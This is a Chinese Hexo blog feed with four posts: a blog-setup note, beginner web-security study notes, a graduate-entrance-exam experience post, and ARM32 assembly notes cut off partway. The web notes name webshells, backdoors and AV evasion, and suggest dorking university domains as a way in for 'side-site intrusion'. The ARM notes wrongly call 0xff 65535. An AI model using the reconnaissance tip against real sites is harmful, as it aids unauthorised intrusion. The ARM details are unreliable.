<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anza | 学习记录</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-02-06T11:17:38.752Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Anza</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2023/04/20/hello-world/"/>
    <id>http://example.com/2023/04/20/hello-world/</id>
    <published>2023-04-20T13:15:33.015Z</published>
    <updated>2023-02-06T11:17:38.752Z</updated>
    
    <content type="html"><![CDATA[<p>新年初终于搭成了属于自己的博客，就简单记录一下2022年的学习情况吧。</p><h2 id="搭建教程"><a href="#搭建教程" class="headerlink" title="搭建教程"></a>搭建教程</h2><h3 id="B站视频"><a href="#B站视频" class="headerlink" title="B站视频"></a>B站视频</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">【2021最新版】保姆级Hexo+github搭建个人博客 up主：视频搬运崽啊</span><br><span class="line">https://www.bilibili.com/video/BV1mU4y1j72n</span><br><span class="line">[馨客栈分享]使用Hexo博客搭建的个人博客，使用Next主题来进行优化改造 up主：Mackxin</span><br><span class="line">https://www.bilibili.com/video/BV16W411t7mq</span><br></pre></td></tr></table></figure><p>感谢以上以及众多帮忙纠错的博客大佬们 (●ˇ∀ˇ●)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;新年初终于搭成了属于自己的博客，就简单记录一下2022年的学习情况吧。&lt;/p&gt;
&lt;h2 id=&quot;搭建教程&quot;&gt;&lt;a href=&quot;#搭建教程&quot; class=&quot;headerlink&quot; title=&quot;搭建教程&quot;&gt;&lt;/a&gt;搭建教程&lt;/h2&gt;&lt;h3 id=&quot;B站视频&quot;&gt;&lt;a href=</summary>
      
    
    
    
    <category term="other" scheme="http://example.com/categories/other/"/>
    
    
  </entry>
  
  <entry>
    <title>入门web</title>
    <link href="http://example.com/2023/04/13/web-basic/"/>
    <id>http://example.com/2023/04/13/web-basic/</id>
    <published>2023-04-13T05:00:05.000Z</published>
    <updated>2023-04-15T08:26:01.736Z</updated>
    
    <content type="html"><![CDATA[<p>学点 WEB。</p><span id="more"></span><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、什么是域名？是由一串用点分隔的名字组成的互联网上某一台计算机或计算机组的名称</span><br><span class="line">2、域名在哪里注册？万网</span><br><span class="line">3、什么是二级域名多级域名？.com:一级、顶级域名;baidu.com:二级域名</span><br><span class="line">4、域名发现对于安全测试意义？利用inurl:edu.cn搜索得到一些学校官网域名，然后利用inurl:hznu.edu.cn可以看到该学校的其他域名，也能作为突破口（旁站入侵）</span><br></pre></td></tr></table></figure><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 什么是DNS？域名-&gt;ip</span><br><span class="line">2. DNS解析过程，HOSTS和DNS的关系？查找dns缓存，若无，再查找本地HOSTS配置，若无，再查找DNS服务器</span><br><span class="line">3. CDN是什么？与DNS的关系？CDN是内容分布网络，根据地区寻找最近的CDN节点，更改DNS解析服务器ip后ping相同的网站如www.youku.com，其ip会不一样</span><br><span class="line">4. 常见DNS攻击？DNS劫持，DNS投毒，使用户解析到恶意地址</span><br></pre></td></tr></table></figure><h3 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 常见的脚本语言？ASP/PHP/ASPX/JAVAWEB/PL/PY/CGI/ACTION</span><br><span class="line">2. 不同脚本类型与安全漏洞的关系？严谨的脚本语言开发的网站程序安全性更高</span><br><span class="line">3. 漏洞挖掘、代码审计与脚本类型的关系？漏洞挖掘、代码审计要求看懂各种语言编写的脚本语言框架</span><br></pre></td></tr></table></figure><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 什么是后门？有哪些后门？用于控制网站，如webshell、rootkiller</span><br><span class="line">2. 后门在安全测试的实际意义？提供网站操作通道</span><br><span class="line">3. 关于后门需要了解哪些？（玩法，免杀：不被检测到）例如打开某个软件触发，用于维持权限</span><br></pre></td></tr></table></figure><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. WEB组成？网站源码（分脚本类型、应用方向），服务器操作系统（windows、linux），中间件（搭建平台，如apache、nginx），数据库（mysql、oracle、db2 ）</span><br><span class="line">2. 为什么以WEB层面为首？因为很多厂商都有自己的网站</span><br></pre></td></tr></table></figure><h3 id="WEB相关安全漏洞"><a href="#WEB相关安全漏洞" class="headerlink" title="WEB相关安全漏洞"></a>WEB相关安全漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. WEB源码类对应漏洞？SQL注入、上传、XSS、代码执行、变量覆盖、逻辑漏洞、反序列化等</span><br><span class="line">2. WEB中间件对应漏洞</span><br><span class="line">3. WEB数据库对应漏洞</span><br><span class="line">4. WEB系统层对应漏洞</span><br><span class="line">5. 其他第三方对应漏洞</span><br><span class="line">6. APP或PC应用结合类</span><br></pre></td></tr></table></figure><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">layer——子域名查询（字典爆破）</span><br><span class="line">burp——代理抓包工具，伪造攻击</span><br></pre></td></tr></table></figure><h2 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h2><h3 id="HTTP报文组成"><a href="#HTTP报文组成" class="headerlink" title="HTTP报文组成"></a>HTTP报文组成</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">请求行：请求方法、URL、协议/版本</span><br><span class="line">请求头</span><br><span class="line">请求正文</span><br></pre></td></tr></table></figure><h3 id="响应HTTP报文组成"><a href="#响应HTTP报文组成" class="headerlink" title="响应HTTP报文组成"></a>响应HTTP报文组成</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">状态行</span><br><span class="line">响应头</span><br><span class="line">响应正文</span><br></pre></td></tr></table></figure><h3 id="常见请求方法"><a href="#常见请求方法" class="headerlink" title="常见请求方法"></a>常见请求方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET:请求指定的页面信息，并返回实体主体。</span><br><span class="line">POST:向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。</span><br><span class="line">HEAD:类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头</span><br><span class="line">PUT:从客户端向服务器传送的数据取代指定的文档的内容。</span><br><span class="line">DELETE:请求服务器删除指定的页面。</span><br></pre></td></tr></table></figure><h3 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">访问一个网页时，浏览器会向web服务器发出请求。此网页所在的服务器会返回一个包含HTTP状态码的信息头用以响应浏览器的请求。</span><br><span class="line">状态码分类：</span><br><span class="line">1XX- 信息型，服务器收到请求，需要请求者继续操作。</span><br><span class="line">2XX- 成功型，请求成功收到，理解并处理。</span><br><span class="line">3XX - 重定向，需要进一步的操作以完成请求。</span><br><span class="line">4XX - 客户端错误，请求包含语法错误或无法完成请求。</span><br><span class="line">5XX - 服务器错误，服务器在处理请求的过程中发生了错误。</span><br></pre></td></tr></table></figure><h3 id="常见状态码"><a href="#常见状态码" class="headerlink" title="常见状态码"></a>常见状态码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">200 OK - 客户端请求成功</span><br><span class="line">301 - 资源（网页等）被永久转移到其它URL</span><br><span class="line">302 - 临时跳转</span><br><span class="line">400 Bad Request - 客户端请求有语法错误，不能被服务器所理解</span><br><span class="line">401 Unauthorized - 请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用</span><br><span class="line">404 - 请求资源不存在，可能是输入了错误的URL</span><br><span class="line">500 - 服务器内部发生了不可预期的错误</span><br><span class="line">503 Server Unavailable - 服务器当前不能处理客户端的请求，一段时间后可能恢复正常。</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">假设用域名扫描某个网站的文件位于目录B，用该域名IP扫描该网站的文件位于目录A，一般来说目录A是目录B的上一级，可以获取更多资料，所以扫IP更好。</span><br><span class="line">复现靶场：vulhub</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;学点 WEB。&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>双非一战上岸武汉大学网安专硕</title>
    <link href="http://example.com/2023/04/03/hznu2whu/"/>
    <id>http://example.com/2023/04/03/hznu2whu/</id>
    <published>2023-04-03T06:35:48.000Z</published>
    <updated>2023-04-07T07:12:33.976Z</updated>
    
    <content type="html"><![CDATA[<img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304042018896.png" alt="image-20230404201805060" style="zoom: 25%;" /><span id="more"></span><h2 id="个人情况"><a href="#个人情况" class="headerlink" title="个人情况"></a>个人情况</h2><p>本人就读于杭州某所双非院校，本科专业为计算机（金融方向），初试成绩 392（69+84+129+110）。</p><p>报考武大网安一方面是因为自己对本科专业方向不是很感兴趣，另一方面作为一名 CTFer 小透明，在我院的网安实验室里做出了点成绩，想去更高的平台看看大佬。</p><p>择校过程：暨南大学网安专 =&gt; 厦门大学计专 =&gt; 武汉大学网安专。</p><p>选择暨大是因为它们网安发展似乎挺不错的，CTF 战队也很牛，而且只考一门数据结构，后期 F*cking 408 学不下去了就直接转；然后想冲厦大一方面是因为 408 算是学下去了，另一方面有个做二进制安全很牛的老师在计院（也图厦大的美丽，但非本部校区）；再后来，厦大招生名单一出，人数砍半，而武大网安那边传来消息说保研选手鸽了好多，名额都腾出来给统招了，遂冲（武大也美，但也非本部校区😭）。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304042052686.jpg" alt="img" style="zoom: 25%;" /><h2 id="初试规划"><a href="#初试规划" class="headerlink" title="初试规划"></a>初试规划</h2><p>武大网安专硕的考试科目为：政治，英语二，数学二，408计算机专业基础。</p><p>鉴于数学、专业课基础比较薄弱，本人从 2022 年一月就开始准备，实际上三月开始准备也完全赶得上。</p><h3 id="政治"><a href="#政治" class="headerlink" title="政治"></a>政治</h3><p>政治无需太早准备，大部分考点（尤其毛中特和史纲）都结合了<strong>时事</strong>，后期会有很多名师帮你整理。</p><p>我是 9 月开始准备政治的，用的参考书为《肖秀荣——知识点精讲精练》和《1000题》，听的是腿姐的基础班，听一章做一章《1000》题（分析题不做），然后跟的也是腿姐的强化班和技巧班，腿姐有对<strong>关键词</strong>做整理，对我厘清知识框架挺有帮助的，技巧班就见仁见智吧，似乎今年有很多人栽在这上面了，但我个人觉得还行。反正就在那几个考研风评不错的政治老师里跟紧一个就对了，政治分数差别不大。</p><p>后期押题卷我只参考了<strong>肖四肖八</strong>，肖八考前一个月会有，肖四考前两周会有，个人认为背诵的优先级：肖四全卷 &gt; 肖八的选择题 &gt; 肖八的分析题。押题卷不一定能囊括所有题目，主要就是巩固知识点和学习话术用的，多背总没错，最后几天自己最好能总结一套分析题的写法。闲着的时候可以在小程序上刷刷习题册或者押题卷。</p><p>由于本人没有复核，参考网上还算权威的答案，估摸着客观38 + 主观31。</p><h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><p>本人英语基础还行，四六级 550+，在考研过程中花在英语上的时间比较少，所以可能不太适合做参考。</p><p>本人用的某贝单词 APP，每天早上起来吃饭的时候只背了 30 个新单词 + 复习 90 个旧单词，然后刷一篇英一或英二的真题完型或者阅读。作文参考王江涛的作文书，有些文章写的确实不错，但也有文章写的比较模板化，最好拿来自己改改，当然如果只想拿个一般分的话直接网上找些模板背就行了。但就群里兄弟们的发言来看，湖北英语作文高低分差得蛮大的，有时间还是要多准备下。</p><p>建议可以在四六级考试前集中几天准备下作文，然后在四六级考试上模拟下，顺便刷个分。本人考研期间考了两次六级，写作/翻译都达到了 185+。</p><p>总的来说，我认为考研英语抓准<strong>单词+真题精读</strong>就够了，英语的学习是<strong>积累+语感培养</strong>的过程，顺便记得把字练好。</p><p>由于本人没有复核，参考网上还算权威的答案，估摸着客观55 + 主观29。</p><h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><p>由于本人高考数学炸了，且大学里高数和线代学得也比较差，对数学一直心有余悸，因此在 1 月开始准备。</p><p>基础阶段：起初我跟的是汤家凤的零基础班，主要是重温一些基础概念，边看边做一些笔记，到 3 月多才看完。然后 4 月左右开始跟武忠祥的基础课，以高数为主，期间使用的习题册是汤家凤的《1800》题，只写了基础篇，基本上是看一章写一章，有些看不太懂的答案思路会拍下来，在吃饭路上思考，很多时候自然就想通了。在 6 月底前也就是暑假开始前，跟完<strong>武忠祥高数</strong>和<strong>李永乐线代</strong>的基础班，刷完了《1800》的基础篇，算是基本了解了高数/线代基础考点。</p><p>强化阶段：7 月暑假留校，开启强化阶段。跟的是武忠祥的高数强化课和李永乐的线代强化课，习题册只用了<strong>《660》</strong>和<strong>《880》</strong>，跟以往思路一样，也是看一章做一章，做完之后整个人都通透了很多，大概到 9 月中旬刷完了这两本习题册。</p><p>刷题巩固阶段：接着开始刷数学历年真题，从 1987 开始，一天刷一份（早期的比较简单，可以一天刷两份），150 分的卷只给自己计时 2 个小时 30 分钟，早上刷完回去午睡，然后下午回来订正。如果没有太多时间或者基础比较好的话，真题可以直接从 2008 年开始刷。大概 11 月左右各大名师的预测卷都要出好了，我使用的是<strong>张宇8+4</strong> 和<strong>李林6+4</strong>，也是一天刷一份。张宇卷写得我想哭，分差极大，要么写得特别好，要么动不动 90+，李林还好，基本都有 110+。但预测卷完全说明不了什么，不要太焦虑了，主要拿来查漏补缺用的，但要<strong>坚持做保持手感</strong>。有些题目不懂可以去 bilibili 找一些大佬 up 主的视频看看，个人比较推荐：没咋了。</p><p>总的来说，数学的每个阶段都很重要，是需要每天花大把时间的，我主要前中期花的时间比较多，白天上下午都拿来复习数学，然后后期刷题阶段就是早上刷一套数学卷子，下午花一个小时不到的时间纠错，纠错完后的时间给政治和英语。对于名师的选择，张宇和武忠祥都可以吧，身边研友都说挺不错的，但最后还得是靠自己。</p><p>ps. 最后考试的时候数学选择只算了一遍，选项分布 1 3 3 3，让我有点害怕，但我还是坚持第一感觉，心理想着顶多错一道，稳一点，最后选择全对，但填空题第一题就错了，让我很无语，所以<strong>简单题有时间得多验算</strong>😭。看到大题的时候有点点懵，感觉不像往常的题型，但做下去发现也只是套了层皮，也基本一遍过，除了证明题第二问基本都写出来了。</p><p>由于本人没有复核，参考网上还算权威的答案，估摸着客观70 + 主观59。</p><h3 id="408计算机专业基础"><a href="#408计算机专业基础" class="headerlink" title="408计算机专业基础"></a>408计算机专业基础</h3><p>虽是科班，但没上过计组和操作系统的课程。不过有二进制安全学习经历，学起来不算太累。考研期间，我一般把晚上 4 个小时左右的时间拿来复习 408。</p><p>学 408 要<strong>反复多次</strong>，参考书用<strong>王道</strong>就够了。我 3 月开始跟王道的基础课，看课顺序是数据结构、计组、操作系统、计网，听一章课做一章课的课后习题，听的过程中可以做些简单的笔记，可以做在书上，也可以做在另外的笔记本上。我大概是 6 月多听完第一遍后，发现很多之前的概念都会忘掉了。这是正常的，408 内容比较多，看到第二遍第三遍回忆得会越来越来快。</p><p>我 6 月后也就是暑假期间又细听了一遍基础课，一些算法过程、PV 操作都跟着在纸上模拟了一遍，另外做了厚厚的六本笔记本，最后自己整理的时候也还算是有用。（但笔记做得太冗杂了，而且时间成本高，精简点会好些）</p><p>9 月开始会比较迷茫，感觉很多都学了，选择题能做，但试卷大题还是不会，这个时候就可以开始跟王道的强化课（很重要，可以更早开始！！），强化课主要对<strong>常见考点</strong>做了梳理，会花几个课时帮你理解一个知识分支，也会教一些答题技巧。10 月开始就是刷真题，<strong>真题特别特别重要，因为知识点会反复考！！！！</strong>我是每天晚上计时做一张，然后放到第二天下午和数学一起校对。有时间的话真题一定要多过几轮，我第一轮是自己写一遍，第二轮就是看一题校对一题，要把每个选择题选项都搞清楚，大题把几个常见算法、PV 操作都多默写几遍。有空可以再写一遍王道课后习题，查漏补缺，把一些陌生的知识点记录在下来，主打一个<strong>反复多次</strong>。</p><p>总的来说，学 408 的过程一定要有<strong>耐心</strong>，有很长一段时间我都会觉得自己好像啥也没学懂，但到了后期强化、刷卷阶段会发现都是那几个知识点在反复考，所以有很大一部分分数努努力就能拿到。  </p><p>ps. 今年死在数据结构上了，光数据结构选择就错了 5 个，其他每门选择都只错 1 个，数据结构第二大题外部排序算法思想没想起来，就对了第二小问，操作系统有一大题排序的也纠结了很久。校对完答案一直觉得自己只有 100 分左右，担心了好久😭，好在最后结果还不错。</p><p>由于本人没有复核，参考网上还算权威的答案，估摸着客观64 + 主观46。</p><h2 id="复试规划"><a href="#复试规划" class="headerlink" title="复试规划"></a>复试规划</h2><p>武安复试包括笔试和综合面试（主要是英语面试和专业面试）。</p><p>基本问题之前有学长总结过：<a href="https://blog.wangx.wang/index.php/archives/171/">关于武大网安复试的一些QA</a>，由于不能透露具体内容，就简单讲讲如何准备的。</p><h3 id="笔试"><a href="#笔试" class="headerlink" title="笔试"></a>笔试</h3><p>参考书目：《信息系统安全概论》，石文昌著。第二第三版都可以。</p><p>考察的课内知识比较基础，从<strong>概念、优缺点、实现方法、例子</strong>这几个角度整理即可。</p><p>有涉及一些课外的知识，但问得也很开放。</p><p>ps. 最后写得满满当当，拿了个 80 平均分。</p><h3 id="面试"><a href="#面试" class="headerlink" title="面试"></a>面试</h3><p>复试英语参考文章：<a href="http://www.cskaoyan.com/forum.php?mod=viewthread&tid=654288&highlight=%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD">19武大网安英语口语准备资料及一点个人体会</a></p><p>英语面试：参考上面的文章准备了将近十来个日常问题，最后也押中了两个，最好也准备下专业问题。英语面试过程中，感觉考官更注重<strong>口语的流畅度和逻辑</strong>，而非口语内容，所以无需太多高级词汇。</p><p>专业面试：可以交<strong>简历</strong>，也建议有竞赛、项目、论文的同学交简历，前提是要清楚自己工作的部分。<strong>毕设</strong>也要好好准备一下，如果是跟安全有关的，老师很可能会问。</p><p>ps. 我在面试前头脑一片空白，紧张得自我介绍也背不顺了😭，就索性放空自己🤯，面试的时候就是想到啥说啥，缝合了好多个提前准备的回答。老师们也都很和蔼，许多深入的方向也没有追问，时间很快就过去啦~</p><p>最终本人复试成绩意料之外地位于小组第一，属实受宠若惊😭，感谢各位老师抬爱。</p><h2 id="个人心得与致谢"><a href="#个人心得与致谢" class="headerlink" title="个人心得与致谢"></a>个人心得与致谢</h2><h3 id="个人心得"><a href="#个人心得" class="headerlink" title="个人心得"></a>个人心得</h3><ul><li>考研择校很重要，但也不用太早就敲定要考某个学校，后期根据自身情况和招生方案再做抉择也不迟。如果只是想图个 211 学历，可以选农林、财经、师范类的高校的一些计算机交叉专业。</li><li>如果考计算机方向的专业，优先准备 408，408 是大势所趋，而且在我看来也是科班学生应当具备的知识基础。</li><li>IT 专业考研难度一般是：计算机 &gt; 软工 ≈ 网安 ≈ 人工智能。但近几年大家似乎都太过求稳了，今年扩招的武大网安专硕划线 355，缩招的武大计科专硕划线 360，缩招的厦大计科专硕划线 350，而且福建还是水区，只能说被劝退的人不少。另外，刚改考 408 的南理工好像也炸了，就连双非也炸得离谱，考我们本校 22408 的软工专硕居然能有 391 的考生，只能说太卷辣！</li></ul><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052028047.png" alt="image-20230405202822686" style="zoom: 33%;" /><ul><li>可以通过目标院校的考研群收集资料，一般来说王道的群成员人数多一些。招生信息出后，群里就会开始“引流”和“劝退”，就像我原本在厦大计科群，被引到了武大网安群。其次，切勿水群，十月确认院校后把其他院校的群退了。</li><li>警惕 B乎 匿名用户打心态牌，动不动“小道消息”、“内部消息”、“今年爆炸”，给他点个👎看他还发不发电！</li><li>按照自己最好的状态学，不必跟上别人的节奏。像我的学习时间一般是早上：9 ~ 12，下午：14 ~ 17，晚：18 ~ 22。偶尔也会摸🐟，打打游戏什么的，但打完记得卸掉（瘾犯了下回来后，打完再卸），现在对游戏已无感？</li><li>和研友们定期约个饭，打卡周边一些美食店，释放考研压力。</li></ul><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052118011.png" alt="image-20230405211807371" style="zoom: 40%;" /><h3 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h3><p>感谢老爸老妈因为担心我的复试情况跑来武汉为我分担压力（<del>虽然两天后因为水土不服就回去了）</del>，感谢老姐滴支持。</p><p>感谢刘老师、实验室里的学长学姐还有一起打比赛的师傅们，特别感谢 <strong>@j1ang</strong> &amp; <strong>@4XWi11</strong> &amp; <strong>@scr1pt</strong>，带着我这个菜鸡混了好多奖😭。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052134673.png" alt="image-20230405213418516" style="zoom:40%;" /><p>感谢 <strong>@verf1sh</strong> 师傅和 <strong>@tty</strong> 师傅，在我学习二进制的过程中给了我很多启发。</p><p>感谢 HZNU，感谢我的饭友们，再次感谢所有关心、鼓励、支持我的家人和朋友们。</p><p>最后感谢努力了一年的自己🙂。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052158276.jpg" alt="img" style="zoom: 50%;" />]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304042018896.png&quot; alt=&quot;image-20230404201805060&quot; style=&quot;zoom: 25%;&quot; /&gt;</summary>
    
    
    
    <category term="other" scheme="http://example.com/categories/other/"/>
    
    
  </entry>
  
  <entry>
    <title>arm32</title>
    <link href="http://example.com/2023/02/06/arm32/"/>
    <id>http://example.com/2023/02/06/arm32/</id>
    <published>2023-02-06T11:15:31.000Z</published>
    <updated>2023-02-18T07:09:05.522Z</updated>
    
    <content type="html"><![CDATA[<p>进行一个arm架构的学习。</p><span id="more"></span><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>ARM是<code>RISC</code>（精简指令集）处理器，不同于x86指令集（复杂指令集）。ARM指令本身是32位设计，但也配备16位指令集，即<code>Thumb</code>指令，<code>Thumb</code>指令可以看作是<code>ARM</code>指令压缩形式的子集。</p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><h3 id="R0-R7"><a href="#R0-R7" class="headerlink" title="R0~R7"></a>R0~R7</h3><p>所有工作模式下，<code>R0~R7</code>都分别指向同一个物理寄存器（共8个物理寄存器），它们未被系统用作特殊的用途。其中，<strong>R0~R3</strong>作为参数传递进入，<strong>R0</strong>作为结果传出进行比较。</p><h3 id="R8-R12"><a href="#R8-R12" class="headerlink" title="R8~R12"></a>R8~R12</h3><p>用于存放函数的局部变量，<code>Thumb</code>通常无法访问。如果被调用函数使用了这些寄存器（包括<code>r4~r7</code>），它在返回之前必须恢复这些寄存器的值。</p><p>其中<code>R11</code>即<code>FP栈帧指针寄存器</code>始终指向栈底。</p><h3 id="R13"><a href="#R13" class="headerlink" title="R13"></a>R13</h3><p>存储栈指针，即<strong>SP</strong>指针。</p><h3 id="R14"><a href="#R14" class="headerlink" title="R14"></a>R14</h3><p>又被称为连接寄存器即<strong>LR</strong>，用于保存子程序以及中断的返回地址。</p><h3 id="R15"><a href="#R15" class="headerlink" title="R15"></a>R15</h3><p>即程序计数器<strong>PC</strong>。</p><h3 id="CPSR-SPSR"><a href="#CPSR-SPSR" class="headerlink" title="CPSR/SPSR"></a>CPSR/SPSR</h3><p>所有处理器模式下都可访问当前程序状态寄存器<code>CPSR</code>。</p><p><code>CPSR</code>中包含条件码标志、中断禁止位、当前处理器模式以及其他状态和控制信息。在每种异常模式下都有一个对用的程序状态寄存器<code>SPSR</code>。</p><p>当异常出现时，<code>SPSR</code>用于保存<code>CPSR</code>的状态，以便异常返回后恢复异常发生时的工作状态。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>在中断程序中，所有的寄存器都必须保护，编译器会自动保护<code>R4～R11</code>。</p><h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h2><h3 id="MOV——数据传送指令"><a href="#MOV——数据传送指令" class="headerlink" title="MOV——数据传送指令"></a>MOV——数据传送指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">它的传送指令只能是把一个寄存器的值(要能用立即数表示)赋给另一个寄存器，或者将一个常量赋给寄存器，将后边的量赋给前边的量，比如</span><br><span class="line">MOV r1,r2</span><br><span class="line">MOV r1,#4096</span><br><span class="line">这个立即数是小于0xff（65535）的数，如果大于65535，则用LDR指令赋值</span><br></pre></td></tr></table></figure><h3 id="B、BL——相对跳转指令"><a href="#B、BL——相对跳转指令" class="headerlink" title="B、BL——相对跳转指令"></a>B、BL——相对跳转指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">B只是跳转，相当于JMP。</span><br><span class="line">而BL除跳转外还将返回地址(BL的下一条指令的地址)保存到LR寄存器中，通常用于调用子程序。</span><br><span class="line">其中跳转范围是当前指令的前后32M。</span><br></pre></td></tr></table></figure><h3 id="LDR、STR——内存访问指令"><a href="#LDR、STR——内存访问指令" class="headerlink" title="LDR、STR——内存访问指令"></a>LDR、STR——内存访问指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LDR既可能是大范围的地址读取伪指令，也可能是内存读取指令。第二个参数前有“=”表示伪指令。</span><br><span class="line">LDR R0, =0x53000000; r0=0x53000000</span><br><span class="line">LDR R1, [R2,#4]         ; 将地址为 R2+4 的内存单元数据读取到 R1 中</span><br><span class="line">LDR R1, [R2]             ; 将地址为 R2 的内存单元数据读取到 R1 中</span><br><span class="line">LDR R1, [R2], #4         ; 将地址为 R2 的内存单元数据读取到 R1中，然后 R2=R2+4</span><br><span class="line"></span><br><span class="line">STR是内存写入指令。</span><br><span class="line">STR R1, [R2, #4]         ; 将 R1 的数据保存到地址为 R2+4 的内存单元中</span><br><span class="line">STR R1, [R2]                ; 将 R1 的数据保存到地址为 R2 的内存单元中</span><br><span class="line">STR R1, [R2], #4         ; 将 R1 的数据保存到地址为 R2 的内存单元中，然后 R2=R2+4</span><br></pre></td></tr></table></figure><h3 id="ADD、SUB——加法减法指令"><a href="#ADD、SUB——加法减法指令" class="headerlink" title="ADD、SUB——加法减法指令"></a>ADD、SUB——加法减法指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">共三个参数，将后边的两个参数操作并赋给第一个参数，比如:</span><br><span class="line">ADD R1, R1, R0; R1=R1+R0</span><br><span class="line">SUB R1, R1, R2; R1=R1-R2</span><br></pre></td></tr></table></figure><h3 id="ASR、LSR、LSL、ROR、RRX、Type-Rs——移位指令"><a href="#ASR、LSR、LSL、ROR、RRX、Type-Rs——移位指令" class="headerlink" 